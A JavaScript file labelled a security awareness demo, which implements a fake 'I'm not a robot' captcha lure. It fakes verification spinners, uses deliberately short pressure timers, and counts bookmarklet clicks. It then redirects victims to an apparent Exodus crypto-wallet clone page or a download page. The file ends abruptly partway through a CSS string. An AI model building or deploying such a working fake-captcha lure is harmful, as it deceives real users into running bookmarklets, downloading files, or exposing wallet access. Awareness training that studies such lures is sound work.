/**
 * Security Awareness Demo – Captcha Phishing
 *
 * Two-stage flow: Stage 1 = captcha images + counters; Stage 2 = math question (answer from localStorage).
 * 20 second countdown timer. LocalStorage keys: additionClickCount, subtractionClickCount, etc.
 */

(function () {
  "use strict";

  var captchaWidgetHost = document.getElementById("captcha-widget-host");
  function getEl(id) {
    var el = document.getElementById(id);
    if (el) return el;
    if (captchaWidgetHost && captchaWidgetHost.shadowRoot) {
      return captchaWidgetHost.shadowRoot.getElementById(id);
    }
    return null;
  }

  const STORAGE_KEYS = {
    addition: "additionClickCount",
    subtraction: "subtractionClickCount",
    multiplication: "multiplicationClickCount",
    division: "divisionClickCount",
  };
  const REQUIRED_CLICKS = 10;
  const REDIRECT_DELAY_MS = 3000;
  const COUNTDOWN_SECONDS = 20;
  const VERIFYING_DELAY_MS = 4000;
  const REDIRECT_AFTER_VERIFY_MS = 3000;

  const timerEl = getEl("timer");
  const timerValue = getEl("timer-value");
  const answerValue = getEl("answerValue");
  const doneButton = getEl("doneButton");
  const submitButton = getEl("submitButton");
  const captchaContainer = getEl("captcha-container");
  const stage1Buttons = getEl("stage1-buttons");
  const stage2 = getEl("stage2");
  const mathQuestion = getEl("mathQuestion");
  const mathAnswerInput = getEl("mathAnswerInput");
  const mathFeedback = getEl("mathFeedback");
  const verifyingScreen = getEl("verifying-screen");
  const captchaContent = getEl("captcha-content");
  const robotCheckbox = getEl("robotCheckbox");
  const captchaBox = getEl("captcha-box");
  const verifyHumanBtn = getEl("verifyHumanBtn");
  const verifyStep = getEl("verify-step");
  const verifyLoader = getEl("verifyLoader");
  const challengePopupOverlay = getEl("challenge-popup-overlay");
  const exodusPopupOverlay = getEl("exodus-popup-overlay");
  const exodusPopupOk = getEl("exodus-popup-ok");
  const verifiedScreen = getEl("verified-screen");
  const captchaWidget = getEl("captcha-widget");
  const verifyStatus = getEl("verify-status");
  const verifySpinner = getEl("verify-spinner");
  const verifyStatusText = getEl("verify-status-text");
  const verifySuccess = getEl("verify-success");
  const verifySuccessMsg = getEl("verify-success-msg");
  const verifySuccessHost = getEl("verify-success-host");
  const captchaWidgetWrap = getEl("captcha-widget-wrap");

  let verifyTimeouts = [];

  let countdownRemaining = COUNTDOWN_SECONDS;
  let countdownInterval = null;
  let stage = 1; // 1 = captcha images, 2 = math question

  function getCount(key) {
    try {
      const raw = localStorage.getItem(key);
      const n = parseInt(raw, 10);
      return Number.isFinite(n) ? Math.max(0, n) : 0;
    } catch {
      return 0;
    }
  }

  function getAllCounts() {
    return {
      addition: getCount(STORAGE_KEYS.addition),
      subtraction: getCount(STORAGE_KEYS.subtraction),
      multiplication: getCount(STORAGE_KEYS.multiplication),
      division: getCount(STORAGE_KEYS.division),
    };
  }

  function getTotalClicks() {
    const c = getAllCounts();
    return c.addition + c.subtraction + c.multiplication + c.division;
  }

  function setAnswerDisplay() {
    if (!answerValue) return;
    const c = getAllCounts();
    if (c.addition === 0 && c.subtraction === 0 && c.multiplication === 0 && c.division === 0) {
      answerValue.textContent = "Your selections will appear here.";
      return;
    }
    answerValue.textContent =
      "Addition: " +
      c.addition +
      ", Subtraction: " +
      c.subtraction +
      ", Multiplication: " +
      c.multiplication +
      ", Division: " +
      c.division;
  }

  function startCountdown() {
    if (countdownInterval) return;
    if (timerValue) timerValue.textContent = countdownRemaining;
    countdownInterval = setInterval(function () {
      countdownRemaining -= 1;
      if (timerValue) timerValue.textContent = countdownRemaining;
      if (timerEl) {
        timerEl.classList.remove("timer-low");
        if (countdownRemaining <= 5) timerEl.classList.add("timer-low");
        if (countdownRemaining <= 0) timerEl.classList.add("timer-out");
      }
      if (countdownRemaining <= 0) {
        clearInterval(countdownInterval);
        countdownInterval = null;
        onTimeUp();
      }
    }, 1000);
  }

  function onTimeUp() {
    if (stage === 1) {
      if (captchaContainer) captchaContainer.classList.add("hidden");
      if (stage1Buttons) stage1Buttons.classList.add("hidden");
      if (answerValue) answerValue.textContent = "Time's up. You can try again by refreshing.";
    } else {
      if (mathAnswerInput) mathAnswerInput.disabled = true;
      if (submitButton) submitButton.disabled = true;
      if (mathFeedback) {
        mathFeedback.textContent = "Time's up.";
        mathFeedback.classList.remove("hidden", "success");
        mathFeedback.classList.add("error");
      }
    }
  }

  function goToStage2() {
    stage = 2;
    if (captchaContainer) captchaContainer.classList.add("hidden");
    if (stage1Buttons) stage1Buttons.classList.add("hidden");
    if (answerValue) answerValue.classList.add("hidden");

    const c = getAllCounts();
    const a = c.addition;
    const b = c.subtraction;
    const correctAnswer = a + b;
    window._captchaCorrectAnswer = correctAnswer; // for verify

    if (mathQuestion) mathQuestion.textContent = a + " + " + b + " = ?";
    if (stage2) stage2.classList.remove("hidden");
    if (mathAnswerInput) {
      mathAnswerInput.value = "";
      mathAnswerInput.focus();
    }
    if (mathFeedback) {
      mathFeedback.classList.add("hidden");
      mathFeedback.classList.remove("success", "error");
    }
  }

  function handleDoneClick() {
    setAnswerDisplay();
    goToStage2();
  }

  function checkProgressAndRedirect() {
    const total = getTotalClicks();
    if (total >= 10) {
      setTimeout(function () {
        window.location.href = "exodus-clone.html";
      }, 1000);
    }
  }

  function handleVerifyAnswer() {
    if (countdownRemaining <= 0) return;
    const correct = window._captchaCorrectAnswer;
    const raw = mathAnswerInput && mathAnswerInput.value.trim();
    const userAnswer = parseInt(raw, 10);
    const isCorrect = Number.isFinite(userAnswer) && userAnswer === correct;

    if (!mathFeedback) return;
    mathFeedback.classList.remove("hidden", "success", "error");
    if (isCorrect) {
      var fromBookmarklet = new URLSearchParams(location.search).get("from_bookmarklet") === "1";
      if (fromBookmarklet) {
        mathFeedback.textContent = "Correct!";
        mathFeedback.classList.add("success");
        if (captchaContent) captchaContent.classList.add("hidden");
        if (verifiedScreen) verifiedScreen.classList.remove("hidden");
        setTimeout(function () {
          window.location.href = "download.html?redirect_to=" + encodeURIComponent("https://www.exodus.com");
        }, 2500);
      } else {
        mathFeedback.textContent = "Correct!";
        mathFeedback.classList.add("success");
        if (exodusPopupOverlay) exodusPopupOverlay.classList.remove("hidden");
      }
    } else {
      mathFeedback.textContent = "Incorrect. Try again.";
      mathFeedback.classList.add("error");
    }
  }

  function handleSubmitClick() {
    if (stage === 2) {
      handleVerifyAnswer();
    }
  }

  if (doneButton) {
    doneButton.addEventListener("click", handleDoneClick);
  }

  if (submitButton) {
    submitButton.addEventListener("click", handleSubmitClick);
  }

  if (mathAnswerInput) {
    mathAnswerInput.addEventListener("keydown", function (e) {
      if (e.key === "Enter") handleVerifyAnswer();
    });
  }

  function openChallenge() {
    if (!captchaBox) return;
    document.body.classList.add("body-popup-open");
    // Reset challenge to stage 1
    var ch1 = getEl("challenge1");
    var ch2 = getEl("challenge2");
    if (ch1) ch1.classList.remove("hidden");
    if (ch2) ch2.classList.add("hidden");
    // Show popup
    if (challengePopupOverlay) challengePopupOverlay.classList.remove("hidden");
    captchaBox.classList.remove("hidden");
    // Position modal with arrow from checkbox (index.html style)
    var popup = challengePopupOverlay ? challengePopupOverlay.querySelector(".challenge-popup") : null;
    var widgetEl = document.getElementById("widget-container");
    var arrowEl = document.getElementById("challenge-popup-arrow-el");
    var arrowLineEl = document.getElementById("challenge-popup-arrow-line-el");
    if (popup && widgetEl) {
      var r = widgetEl.getBoundingClientRect();
      var vw = document.documentElement.clientWidth || window.innerWidth;
      var vh = document.documentElement.clientHeight || window.innerHeight;
      var popupW = Math.min(400, vw - 40);
      var padding = 20;
      var estPopupH = 420;
      var leftOffset = 199;
      var left = Math.max(padding, Math.min(vw - popupW - padding, (vw - popupW) / 2 - leftOffset));
      var top = (vh - estPopupH) / 2 - 80;
      top = Math.max(padding, top);
      top = Math.min(top, vh - estPopupH - padding);
      var maxH = vh - top - padding;
      popup.style.setProperty("left", left + "px", "important");
      popup.style.setProperty("top", top + "px", "important");
      popup.style.setProperty("width", popupW + "px", "important");
      popup.style.setProperty("max-width", popupW + "px", "important");
      popup.style.setProperty("max-height", maxH + "px", "important");
      challengePopupOverlay.classList.add("challenge-popup-anchor");
      popup.classList.add("challenge-popup-with-arrow");
      if (!arrowEl) {
        arrowEl = document.createElement("div");
        arrowEl.id = "challenge-popup-arrow-el";
        arrowEl.className = "challenge-popup-arrow";
        arrowEl.setAttribute("aria-hidden", "true");
        arrowEl.style.display = "none";
        popup.appendChild(arrowEl);
      } else if (arrowEl.parentNode !== popup) {
        popup.appendChild(arrowEl);
      }
      if (!arrowLineEl) {
        arrowLineEl = document.createElement("div");
        arrowLineEl.id = "challenge-popup-arrow-line-el";
        arrowLineEl.className = "challenge-popup-arrow-line";
        arrowLineEl.setAttribute("aria-hidden", "true");
        arrowLineEl.style.display = "none";
        document.body.appendChild(arrowLineEl);
      }
      // Arrow inside modal (border ke sath); line from checkbox to modal edge
      var cbCenterY = r.top + r.height / 2;
      var arrowW = 22;
      var arrowH = 16;
      var lineStartX = r.right;
      var lineEndX = left - arrowW;
      var lineWidth = Math.max(0, lineEndX - lineStartX);
      arrowLineEl.style.left = lineStartX + "px";
      arrowLineEl.style.top = (cbCenterY - 4) + "px";
      arrowLineEl.style.width = lineWidth + "px";
      arrowLineEl.style.display = "block";
      arrowLineEl.style.visibility = "visible";
      arrowEl.style.left = "";
      arrowEl.style.right = "";
      arrowEl.style.top = (cbCenterY - top - arrowH - 10) + "px";
      arrowEl.style.display = "block";
      arrowEl.style.visibility = "visible";
    } else {
      if (arrowEl) { arrowEl.style.display = "none"; arrowEl.style.visibility = "hidden"; }
      if (arrowLineEl) { arrowLineEl.style.display = "none"; arrowLineEl.style.visibility = "hidden"; }
      if (challengePopupOverlay) challengePopupOverlay.classList.remove("challenge-popup-anchor");
      if (popup) {
        popup.classList.remove("challenge-popup-with-arrow");
        popup.style.left = popup.style.top = popup.style.width = popup.style.maxWidth = popup.style.maxHeight = "";
      }
    }
    buildChallenge1Grid();
    // Sync click counter display
    var clickCounterEl = getEl("clickCounter");
    if (clickCounterEl) clickCounterEl.textContent = localStorage.getItem("bookmarkletClicks") || "0";
  }

  function clearVerifyTimeouts() {
    verifyTimeouts.forEach(function (t) { clearTimeout(t); });
    verifyTimeouts = [];
  }

  function resetVerifyUI() {
    clearVerifyTimeouts();
    if (captchaWidget) captchaWidget.classList.remove("verify-active");
    if (verifyStatus) verifyStatus.classList.add("hidden");
    if (verifySpinner) verifySpinner.classList.remove("hidden");
    if (verifyStatusText) {
      verifyStatusText.textContent = "Verifying...";
      verifyStatusText.classList.remove("hidden");
    }
    if (verifySuccess) verifySuccess.classList.add("hidden");
    if (verifySuccessMsg) verifySuccessMsg.classList.add("hidden");
    if (captchaWidgetWrap) captchaWidgetWrap.classList.remove("hidden");
    if (robotCheckbox) robotCheckbox.checked = false;
    var visibleCb = getEl("visibleCheckbox");
    if (visibleCb) visibleCb.classList.remove("checked");
  }

  function startVerifyFlow() {
    clearVerifyTimeouts();
    if (!captchaWidget || !verifyStatus || !verifySpinner || !verifyStatusText || !verifySuccess) {
      openChallenge();
      return;
    }
    captchaWidget.classList.add("verify-active");
    verifyStatus.classList.remove("hidden");
    verifySpinner.classList.remove("hidden");
    verifyStatusText.textContent = "Verifying...";
    verifyStatusText.classList.remove("hidden");
    verifySuccess.classList.add("hidden");

    // After 2.5s of spinner: open the captcha challenge directly
    var t1 = setTimeout(function () {
      resetVerifyUI();
      openChallenge();
    }, 2500);
    verifyTimeouts.push(t1);
  }

  // Clicking the checkbox triggers: spinner -> success message -> then open challenge
  if (robotCheckbox) {
    robotCheckbox.addEventListener("change", function () {
      if (robotCheckbox.checked) {
        startVerifyFlow();
      } else {
        document.body.classList.remove("body-popup-open");
        resetVerifyUI();
        if (captchaBox) captchaBox.classList.add("hidden");
        if (challengePopupOverlay) challengePopupOverlay.classList.add("hidden");
        var arr = document.getElementById("challenge-popup-arrow-el");
        var lineArr = document.getElementById("challenge-popup-arrow-line-el");
        if (arr) { arr.style.display = "none"; arr.style.visibility = "hidden"; }
        if (lineArr) { lineArr.style.display = "none"; lineArr.style.visibility = "hidden"; }
      }
    });
  }

  // Clicking overlay (outside popup) closes the challenge and shows main page again
  if (challengePopupOverlay) {
    challengePopupOverlay.addEventListener("click", function (e) {
      if (e.target === challengePopupOverlay) {
        document.body.classList.remove("body-popup-open");
        if (captchaBox) captchaBox.classList.add("hidden");
        challengePopupOverlay.classList.add("hidden");
        var arr = document.getElementById("challenge-popup-arrow-el");
        var lineArr = document.getElementById("challenge-popup-arrow-line-el");
        if (arr) { arr.style.display = "none"; arr.style.visibility = "hidden"; }
        if (lineArr) { lineArr.style.display = "none"; lineArr.style.visibility = "hidden"; }
      }
    });
  }

  // Widget click: ensure spinner flow runs (same as checking the box)
  if (captchaWidget) {
    captchaWidget.addEventListener("click", function (e) {
      if (e.target && e.target.tagName === "A") return;
      if (!robotCheckbox || robotCheckbox.checked) return;
      robotCheckbox.checked = true;
      var visibleCb = getEl("visibleCheckbox");
      if (visibleCb) visibleCb.classList.add("checked");
      startVerifyFlow();
    });
  }

  // When there is no checkbox (e.g. Applications-style widget): show tick -> brief spinner -> then open modal
  if (!robotCheckbox && challengePopupOverlay) {
    var wc = document.getElementById("widget-container");
    if (wc) {
      wc.addEventListener("click", function (e) {
        e.preventDefault();
        e.stopPropagation();
        if (!window.__captchaWidgetReady) return;
        var container = document.getElementById("widget-container");
        var initialScreen = document.getElementById("initial-load-screen");
        if (container && container.shadowRoot) {
          var checkboxInput = container.shadowRoot.querySelector("input[type=checkbox]");
          if (checkboxInput) checkboxInput.checked = true; // tick mark
        }
        // 1 second pause with spinner, then open modal
        if (initialScreen) initialScreen.classList.remove("hidden");
        if (container) container.classList.add("hidden");
        setTimeout(function () {
          if (initialScreen) initialScreen.classList.add("hidden");
          if (container) container.classList.remove("hidden");
          if (container && container.shadowRoot) {
            var cb = container.shadowRoot.querySelector("input[type=checkbox]");
            if (cb) cb.checked = false;
          }
          openChallenge();
        }, 1000);
      }, true);
    }
  }

  // Also support the button if it exists
  if (verifyHumanBtn) {
    verifyHumanBtn.addEventListener("click", function () {
      if (!robotCheckbox || !robotCheckbox.checked) return;
      startVerifyFlow();
    });
  }

  if (exodusPopupOk) {
    exodusPopupOk.addEventListener("click", function (e) {
      e.preventDefault();
      if (exodusPopupOverlay) exodusPopupOverlay.classList.add("hidden");
      window.location.replace("https://www.exodus.com");
    });
  }

  function showCaptchaAndStart() {
    if (verifyingScreen) {
      verifyingScreen.classList.add("verifying-hidden");
      document.body.classList.remove("verifying-active");
    }
    if (captchaContent) captchaContent.classList.remove("hidden");
    setAnswerDisplay();
  }

  // On load: show only "I'm not a robot" (captcha-content visible, captcha-box hidden, verifying-screen hidden)
  document.body.classList.remove("verifying-active");
  setAnswerDisplay();

  // Clear localStorage on fresh captcha page visit (not from bookmarklet)
  (function () {
    var params = new URLSearchParams(location.search);
    if (!params.get("from_bookmarklet") && !params.get("show_exodus_popup")) {
      localStorage.setItem(STORAGE_KEYS.addition, "0");
      localStorage.setItem(STORAGE_KEYS.subtraction, "0");
      localStorage.setItem(STORAGE_KEYS.multiplication, "0");
      localStorage.setItem(STORAGE_KEYS.division, "0");
      localStorage.setItem("bookmarkletClicks", "0");
      setAnswerDisplay();
    }
  })();

  // If landed with show_exodus_popup=1 (e.g. after 10 symbol clicks), show popup then redirect to exodus
  (function () {
    var params = new URLSearchParams(location.search);
    if (params.get("show_exodus_popup") === "1" && exodusPopupOverlay) {
      if (verifyingScreen) verifyingScreen.classList.add("verifying-hidden");
      document.body.classList.remove("verifying-active");
      if (captchaContent) captchaContent.classList.remove("hidden");
      exodusPopupOverlay.classList.remove("hidden");
    }
  })();

  // Build unified bookmarklet - works from anywhere (captcha page or exodus.com)
  const baseUrlMeta = getEl("captcha-base-url");
  const captchaBaseUrl = (baseUrlMeta && baseUrlMeta.getAttribute("content") && baseUrlMeta.getAttribute("content").trim()) || location.origin;
  const pdfPath = "assets/Backstage%20Logo.pdf";
  const pdfFilename = "Backstage Logo.pdf";
  const GLASS_PCT_PER_CLICK = 0.46;
  const MATH_PROGRESS_CLICKS_FOR_FULL = 200;
  /** Step 2 only: enough bookmark spam → redirect. */
  const SPAM_CLICKS_TO_REDIRECT = 85;
  /** Zombies stage: if user never uses the bookmark in this window, close & retry. */
  const ZOMBIE_NO_BOOKMARK_IDLE_MS = 12000;

  function getStep2SpamClicks() {
    var total = parseInt(localStorage.getItem("bookmarkletClicks") || 0, 10);
    var base = typeof window._challenge2ClicksBaseline === "number" ? window._challenge2ClicksBaseline : 0;
    return Math.max(0, total - base);
  }

  function trySpamRedirect() {
    if (!currentPuzzle || !currentPuzzle.step2 || !currentPuzzle.step2.noManualDone) return;
    if (getStep2SpamClicks() >= SPAM_CLICKS_TO_REDIRECT) {
      showWidgetSuccessThenRedirect();
    }
  }

  /** Close challenge popup, reset widget, prompt user to try again (zombies fail / no bookmark). */
  function closeChallengeForRetry(message) {
    stopChallenge2Visuals();
    if (window._spamRedirectPoll) {
      clearInterval(window._spamRedirectPoll);
      window._spamRedirectPoll = null;
    }
    currentPuzzle = null;
    document.body.classList.remove("body-popup-open");
    if (captchaBox) captchaBox.classList.add("hidden");
    if (challengePopupOverlay) {
      challengePopupOverlay.classList.add("hidden");
      challengePopupOverlay.classList.remove("challenge-popup-anchor");
    }
    var popupRetry = challengePopupOverlay ? challengePopupOverlay.querySelector(".challenge-popup") : null;
    if (popupRetry) {
      popupRetry.classList.remove("challenge-popup-with-arrow");
      popupRetry.style.left = popupRetry.style.top = popupRetry.style.width = popupRetry.style.maxWidth = popupRetry.style.maxHeight = "";
    }
    var arrR = document.getElementById("challenge-popup-arrow-el");
    var lineArrR = document.getElementById("challenge-popup-arrow-line-el");
    if (arrR) {
      arrR.style.display = "none";
      arrR.style.visibility = "hidden";
    }
    if (lineArrR) {
      lineArrR.style.display = "none";
      lineArrR.style.visibility = "hidden";
    }
    if (robotCheckbox) robotCheckbox.checked = false;
    var visibleCbR = getEl("visibleCheckbox");
    if (visibleCbR) visibleCbR.classList.remove("checked");
    resetVerifyUI();
    if (message) alert(message);
  }

  function stopChallenge2Visuals() {
    if (window._jumpDisplayInterval) {
      clearInterval(window._jumpDisplayInterval);
      window._jumpDisplayInterval = null;
    }
    if (window._glassVisualInterval) {
      clearInterval(window._glassVisualInterval);
      window._glassVisualInterval = null;
    }
    if (window._zombiesGameInterval) {
      clearInterval(window._zombiesGameInterval);
      window._zombiesGameInterval = null;
    }
    if (window._stormHealthInterval) {
      clearInterval(window._stormHealthInterval);
      window._stormHealthInterval = null;
    }
    if (window._mathProgressInterval) {
      clearInterval(window._mathProgressInterval);
      window._mathProgressInterval = null;
    }
    if (window._spamRedirectPoll) {
      clearInterval(window._spamRedirectPoll);
      window._spamRedirectPoll = null;
    }
    if (window._zombiesIdleTimeout) {
      clearTimeout(window._zombiesIdleTimeout);
      window._zombiesIdleTimeout = null;
    }
    stopStep2PressureTimer();
  }

  function stopStep2PressureTimer() {
    if (window._step2PressureTimerId) {
      clearInterval(window._step2PressureTimerId);
      window._step2PressureTimerId = null;
    }
  }

  /** Short countdown on step 2 — deliberate pressure; on expiry user must restart from step 1. */
  function startStep2PressureTimer(totalSec) {
    stopStep2PressureTimer();
    if (!totalSec || totalSec < 1) totalSec = 6;
    var remaining = totalSec;
    var valEl = getEl("step2TimerValue");
    var fillEl = getEl("step2TimerFill");
    if (valEl) valEl.textContent = String(remaining);
    if (fillEl) fillEl.style.width = "100%";
    window._step2PressureTimerId = setInterval(function () {
      if (!currentPuzzle || !currentPuzzle.step2) {
        stopStep2PressureTimer();
        return;
      }
      remaining -= 1;
      if (valEl) valEl.textContent = String(Math.max(0, remaining));
      if (fillEl) fillEl.style.width = Math.max(0, (remaining / totalSec) * 100) + "%";
      if (remaining <= 0) {
        stopStep2PressureTimer();
        step2TimerExpired();
      }
    }, 1000);
  }

  function step2TimerExpired() {
    if (getStep2SpamClicks() >= SPAM_CLICKS_TO_REDIRECT) {
      trySpamRedirect();
      return;
    }
    stopChallenge2Visuals();
    if (window._spamRedirectPoll) {
      clearInterval(window._spamRedirectPoll);
      window._spamRedirectPoll = null;
    }
    if (challenge2) challenge2.classList.add("hidden");
    if (challenge1) challenge1.classList.remove("hidden");
    currentPuzzle = getPuzzle();
    buildChallenge1Grid();
    alert("Time's up! Start again from step 1 — the timer is short on purpose so you don't click slowly.");
  }

  (function injectPuzzleVisualStyles() {
    var _pvOld = document.getElementById("puzzle-visual-css");
    if (_pvOld) _pvOld.remove();
    if (!document.getElementById("puzzle-rich-fonts")) {
      var fl = document.createElement("link");
      fl.id = "puzzle-rich-fonts";
      fl.rel = "stylesheet";
      fl.href =
        "https://fonts.googleapis.com/css2?family=Outfit:wght@500;600;700;800&family=JetBrains+Mono:wght@500;700&display=swap";
      document.head.appendChild(fl);
    }
    var st = document.createElement("style");
    st.id = "puzzle-visual-css";
    st.textContent =
      ".challenge-stage2-body.stage2-dark-scene{background:linear-gradient(165deg,#0b1220 0%,#1e293b 55%,#0f172a 100%)!important;border-top:1px solid rgba(255,255,255,.06)!important;gap:12px!important}" +
      ".challenge-stage2-body.stage2-math-rich{background:linear-gradient(180deg,#f8fafc 0%,#eef2ff 50%,#f1f5f9 100%)!important;border-top:1px solid rgba(99,102,241,.12)!important;gap:14px!important}" +
      ".challenge-stage2-body.puzzle-body-tall{min-height:320px!important;justify-content:flex-start!important;padding-top:16px!important;gap:12px!important}" +
      ".puzzle-glass-wrap{width:100%;max-width:320px;margin:0 auto}" +
      ".puzzle-glass-scene{position:relative;height:160px;border-radius:12px;background:linear-gradient(180deg,#87ceeb 0%,#b8dfea 40%,#e8f4f8 100%);display:flex;align-items:center;justify-content:center;overflow:hidden;box-shadow:inset 0 0 0 2px rgba(0,0,0,.06)}" +
      ".puzzle-glass-pane{position:relative;width:72%;height:78%;border-radius:8px;background:linear-gradient(125deg,rgba(255,255,255,.35) 0%,rgba(200,230,255,.25) 40%,rgba(255,255,255,.15) 100%);box-shadow:0 4px 24px rgba(0,80,120,.2),inset 0 1px 0 rgba(255,255,255,.8);border:2px solid rgba(255,255,255,.5);transition:transform .15s,filter .2s}" +
      ".puzzle-glass-pane.hammer-hit{animation:glass-shake .12s ease}" +
      "@keyframes glass-shake{0%,100%{transform:translate(0,0)}25%{transform:translate(-3px,2px)}75%{transform:translate(3px,-2px)}}" +
      ".glass-shine{position:absolute;inset:0;border-radius:6px;background:linear-gradient(105deg,transparent 35%,rgba(255,255,255,.45) 45%,transparent 55%);pointer-events:none}" +
      ".glass-crack-layer{position:absolute;inset:0;border-radius:6px;pointer-events:none;opacity:0;transition:opacity .15s;background-image:url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Cpath d='M50 5 L48 35 L55 50 L42 70 L50 95 M35 20 L48 35 M65 25 L55 50 M30 55 L42 70 M70 60 L50 95' fill='none' stroke='rgba(255,255,255,.75)' stroke-width='1.2'/%3E%3C/svg%3E\");background-size:cover}" +
      ".glass-crack-layer.c2{background-image:url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Cpath d='M20 10 L35 40 L25 65 L40 90 M80 15 L65 45 L75 70 L55 88 M50 5 L35 40 L65 45 L50 5' fill='none' stroke='rgba(200,230,255,.9)' stroke-width='1.4'/%3E%3C/svg%3E\")}" +
      ".glass-crack-layer.c3{background-image:url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Cpath d='M5 50 L30 48 L50 30 L70 52 L95 45 M15 75 L30 48 M85 25 L70 52' fill='none' stroke='rgba(255,255,255,.85)' stroke-width='1.5'/%3E%3C/svg%3E\")}" +
      ".glass-shards{position:absolute;inset:0;pointer-events:none;z-index:5;opacity:0}" +
      ".puzzle-glass-scene.glass-destroyed .glass-shards{opacity:1}" +
      ".glass-shard{position:absolute;left:50%;top:50%;width:38%;height:42%;margin-left:-19%;margin-top:-21%;border-radius:6px;background:linear-gradient(125deg,rgba(255,255,255,.55) 0%,rgba(200,230,255,.4) 50%,rgba(255,255,255,.25) 100%);box-shadow:0 4px 14px rgba(0,60,100,.35),inset 0 1px 0 rgba(255,255,255,.9);border:1px solid rgba(255,255,255,.7);opacity:0}" +
      ".puzzle-glass-scene.glass-destroyed .glass-shard{opacity:1}" +
      ".puzzle-glass-scene.glass-destroyed .glass-shard:nth-child(1){animation:gs1 .5s ease-out forwards}" +
      ".puzzle-glass-scene.glass-destroyed .glass-shard:nth-child(2){animation:gs2 .52s ease-out forwards}" +
      ".puzzle-glass-scene.glass-destroyed .glass-shard:nth-child(3){animation:gs3 .48s ease-out forwards}" +
      ".puzzle-glass-scene.glass-destroyed .glass-shard:nth-child(4){animation:gs4 .5s ease-out forwards}" +
      ".puzzle-glass-scene.glass-destroyed .glass-shard:nth-child(5){animation:gs5 .51s ease-out forwards}" +
      ".puzzle-glass-scene.glass-destroyed .glass-shard:nth-child(6){animation:gs6 .49s ease-out forwards}" +
      ".puzzle-glass-scene.glass-destroyed .glass-shard:nth-child(7){animation:gs7 .53s ease-out forwards}" +
      ".puzzle-glass-scene.glass-destroyed .glass-shard:nth-child(8){animation:gs8 .5s ease-out forwards}" +
      "@keyframes gs1{0%{transform:translate(0,0) rotate(0)}100%{transform:translate(-72px,-28px) rotate(-32deg)}}" +
      "@keyframes gs2{0%{transform:translate(0,0) rotate(0)}100%{transform:translate(68px,-35px) rotate(28deg)}}" +
      "@keyframes gs3{0%{transform:translate(0,0) rotate(0)}100%{transform:translate(-40px,52px) rotate(18deg)}}" +
      "@keyframes gs4{0%{transform:translate(0,0) rotate(0)}100%{transform:translate(52px,48px) rotate(-22deg)}}" +
      "@keyframes gs5{0%{transform:translate(0,0) scale(.85) rotate(0)}100%{transform:translate(-8px,-62px) scale(.9) rotate(12deg)}}" +
      "@keyframes gs6{0%{transform:translate(0,0) scale(.8) rotate(0)}100%{transform:translate(12px,58px) scale(.85) rotate(-15deg)}}" +
      "@keyframes gs7{0%{transform:translate(0,0) rotate(0)}100%{transform:translate(-58px,18px) rotate(25deg)}}" +
      "@keyframes gs8{0%{transform:translate(0,0) rotate(0)}100%{transform:translate(58px,12px) rotate(-30deg)}}" +
      ".puzzle-glass-pane.shattered{animation:glass-break .35s ease-out forwards}" +
      "@keyframes glass-break{to{transform:scale(.12) rotate(6deg);filter:brightness(1.4) blur(2px);opacity:0}}" +
      ".puzzle-glass-scene.glass-destroyed .glass-shine{opacity:0;transition:opacity .2s}" +
      ".puzzle-storm-v2{position:relative;width:100%;max-width:320px;margin:0 auto;min-height:268px;border-radius:20px;overflow:hidden;box-shadow:0 12px 40px rgba(0,0,0,.45),inset 0 1px 0 rgba(255,255,255,.1);background:linear-gradient(165deg,#0a0e14 0%,#15201f 38%,#0f1419 100%);border:1px solid rgba(255,255,255,.12);font-family:'Outfit',system-ui,sans-serif}" +
      ".storm-fog{position:absolute;inset:0;background:radial-gradient(ellipse 90% 65% at 50% 100%,rgba(34,197,94,.18),transparent 50%),radial-gradient(ellipse 80% 60% at 20% 30%,rgba(139,92,246,.12),transparent);pointer-events:none;z-index:1;animation:storm-fog-drift 9s ease-in-out infinite alternate}" +
      "@keyframes storm-fog-drift{0%{opacity:.85}100%{opacity:1}}" +
      ".storm-clouds{position:absolute;top:0;left:0;right:0;height:48%;background:radial-gradient(ellipse 85% 100% at 50% 0%,rgba(15,23,42,.9),transparent);pointer-events:none;z-index:2}" +
      ".storm-rain-v2{position:absolute;inset:0;pointer-events:none;z-index:6}" +
      ".rain-drop{position:absolute;width:2px;height:14px;background:linear-gradient(180deg,rgba(200,230,255,.9),rgba(200,230,255,.15));border-radius:1px;animation:rain-drop-fall linear infinite}" +
      "@keyframes rain-drop-fall{0%{transform:translateY(-20px);opacity:0}10%{opacity:1}100%{transform:translateY(220px);opacity:.3}}" +
      ".storm-zombie-glass-panel{position:relative;z-index:5;margin:16px 12px 14px;padding:18px 14px 20px;border-radius:20px;background:linear-gradient(155deg,rgba(255,255,255,.14) 0%,rgba(255,255,255,.05) 50%,rgba(0,0,0,.1) 100%);backdrop-filter:blur(16px) saturate(1.5);-webkit-backdrop-filter:blur(16px) saturate(1.5);border:1px solid rgba(255,255,255,.28);box-shadow:0 0 0 1px rgba(255,255,255,.06) inset,0 16px 48px rgba(0,0,0,.4),inset 0 1px 0 rgba(255,255,255,.2);display:flex;align-items:center;justify-content:center;min-height:150px}" +
      ".storm-zombie-bust{position:relative;width:120px;height:138px;margin:0 auto}" +
      ".z-tomb-tag{position:absolute;top:-10px;right:-6px;font-size:8px;font-weight:800;letter-spacing:.1em;color:rgba(255,255,255,.9);background:linear-gradient(135deg,rgba(220,38,38,.75),rgba(127,29,29,.85));padding:4px 9px;border-radius:8px;border:1px solid rgba(255,255,255,.25);text-transform:uppercase;z-index:4;box-shadow:0 4px 12px rgba(0,0,0,.35)}" +
      ".z-skull{position:absolute;left:50%;top:4px;transform:translateX(-50%);width:92px;height:96px;border-radius:44% 44% 38% 38%;background:linear-gradient(180deg,#6b9e5c 0%,#3d5c38 42%,#243a22 100%);border:3px solid #142818;box-shadow:inset 0 -8px 18px rgba(0,0,0,.4),inset 0 3px 0 rgba(255,255,255,.12),0 8px 24px rgba(0,0,0,.35)}" +
      ".z-skull::before{content:'';position:absolute;top:18px;left:14px;width:14px;height:5px;background:rgba(0,0,0,.25);border-radius:2px;box-shadow:48px 0 0 rgba(0,0,0,.25)}" +
      ".z-eye{position:absolute;top:34px;width:20px;height:22px;border-radius:50%;background:radial-gradient(circle at 35% 35%,#fef3c7 0%,#f59e0b 50%,#b45309 100%);box-shadow:0 0 16px #f97316,0 0 28px rgba(249,115,22,.45);border:2px solid #422006}" +
